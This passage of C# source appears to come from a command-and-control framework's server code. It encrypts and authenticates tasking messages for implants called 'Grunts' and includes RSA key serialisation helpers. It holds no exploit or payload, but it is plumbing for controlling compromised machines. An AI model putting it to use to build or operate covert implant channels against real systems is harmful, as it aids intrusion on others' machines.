                public string Meta { get; set; } = "";

                public string IV { get; set; }
                public string EncryptedMessage { get; set; }
                public string HMAC { get; set; }

                private static GruntEncryptedMessage Create(string GUID, byte[] message, byte[] key, GruntEncryptedMessageType Type = GruntEncryptedMessageType.Tasking)
                {
                    byte[] encryptedMessagePacket = EncryptUtilities.AesEncrypt(message, key);
                    byte[] encryptionIV = encryptedMessagePacket.Take(Common.AesIVLength).ToArray();
                    byte[] encryptedMessage = encryptedMessagePacket.TakeLast(encryptedMessagePacket.Length - Common.AesIVLength).ToArray();
                    byte[] hmac = EncryptUtilities.ComputeHMAC(encryptedMessage, key);
                    return new GruntEncryptedMessage
                    {
                        GUID = GUID,
                        Type = Type,
                        EncryptedMessage = Convert.ToBase64String(encryptedMessage),
                        IV = Convert.ToBase64String(encryptionIV),
                        HMAC = Convert.ToBase64String(hmac)
                    };
                }

                public static GruntEncryptedMessage Create(APIModels.Grunt grunt, byte[] message, GruntEncryptedMessageType Type = GruntEncryptedMessageType.Tasking)
                {
                    if (grunt.Status == APIModels.GruntStatus.Uninitialized || grunt.Status == APIModels.GruntStatus.Stage0)
                    {
                        return Create(grunt.Guid, message, Convert.FromBase64String(grunt.GruntSharedSecretPassword), Type);
                    }
                    return Create(grunt.Guid, message, Convert.FromBase64String(grunt.GruntNegotiatedSessionKey), Type);
                }

                public bool VerifyHMAC(byte[] Key)
                {
                    if (IV == "" || EncryptedMessage == "" || HMAC == "" || Key.Length == 0) { return false; }
                    try
                    {
                        var hashedBytes = Convert.FromBase64String(this.EncryptedMessage);
                        return EncryptUtilities.VerifyHMAC(hashedBytes, Convert.FromBase64String(this.HMAC), Key);
                    }
                    catch
                    {
                        return false;
                    }
                }
            }

            // Data should be of format: IV (16 bytes) + EncryptedBytes
            public byte[] GruntSessionDecrypt(APIModels.Grunt grunt, byte[] data)
            {
                return EncryptUtilities.AesDecrypt(data, Convert.FromBase64String(grunt.GruntNegotiatedSessionKey));
            }

            // Convenience method for decrypting a GruntEncryptedMessage
            public byte[] GruntSessionDecrypt(APIModels.Grunt grunt, GruntEncryptedMessage gruntEncryptedMessage)
            {
                return this.GruntSessionDecrypt(grunt, Convert.FromBase64String(gruntEncryptedMessage.IV)
                    .Concat(Convert.FromBase64String(gruntEncryptedMessage.EncryptedMessage)).ToArray());
            }
        }
    }

    internal static class RSAKeyExtensions
    {
        public static void FromXmlString(this RSA rsa, string xmlString)
        {
            RSAParameters parameters = new RSAParameters();

            XmlDocument xmlDoc = new XmlDocument();
            xmlDoc.LoadXml(xmlString);

            if (xmlDoc.DocumentElement.Name.Equals("RSAKeyValue"))
            {
                foreach (XmlNode node in xmlDoc.DocumentElement.ChildNodes)
                {
                    switch (node.Name)
                    {
                        case "Modulus": parameters.Modulus = (string.IsNullOrEmpty(node.InnerText) ? null : Convert.FromBase64String(node.InnerText)); break;
                        case "Exponent": parameters.Exponent = (string.IsNullOrEmpty(node.InnerText) ? null : Convert.FromBase64String(node.InnerText)); break;
                        case "P": parameters.P = (string.IsNullOrEmpty(node.InnerText) ? null : Convert.FromBase64String(node.InnerText)); break;
                        case "Q": parameters.Q = (string.IsNullOrEmpty(node.InnerText) ? null : Convert.FromBase64String(node.InnerText)); break;
                        case "DP": parameters.DP = (string.IsNullOrEmpty(node.InnerText) ? null : Convert.FromBase64String(node.InnerText)); break;
                        case "DQ": parameters.DQ = (string.IsNullOrEmpty(node.InnerText) ? null : Convert.FromBase64String(node.InnerText)); break;
                        case "InverseQ": parameters.InverseQ = (string.IsNullOrEmpty(node.InnerText) ? null : Convert.FromBase64String(node.InnerText)); break;
                        case "D": parameters.D = (string.IsNullOrEmpty(node.InnerText) ? null : Convert.FromBase64String(node.InnerText)); break;
                    }
                }
            }
            else
            {
                throw new Exception("Invalid XML RSA key.");
            }

            rsa.ImportParameters(parameters);
        }

        public static string ToXmlString(this RSA rsa, bool includePrivateParameters)
        {
            RSAParameters parameters = rsa.ExportParameters(includePrivateParameters);

            return string.Format("<RSAKeyValue><Modulus>{0}</Modulus><Exponent>{1}</Exponent><P>{2}</P><Q>{3}</Q><DP>{4}</DP><DQ>{5}</DQ><InverseQ>{6}</InverseQ><D>{7}</D></RSAKeyValue>",
                  parameters.Modulus != null ? Convert.ToBase64String(parameters.Modulus) : null,
                  parameters.Exponent != null ? Convert.ToBase64String(parameters.Exponent) : null,
                  parameters.P != null ? Convert.ToBase64String(parameters.P) : null,
                  parameters.Q != null ? Convert.ToBase64String(parameters.Q) : null,
                  parameters.DP != null ? Convert.ToBase64String(parameters.DP) : null,
                  parameters.DQ != null ? Convert.ToBase64String(parameters.DQ) : null,
                  parameters.InverseQ != null ? Convert.ToBase64String(parameters.InverseQ) : null,
                  parameters.D != null ? Convert.ToBase64String(parameters.D) : null);
        }
    }
}
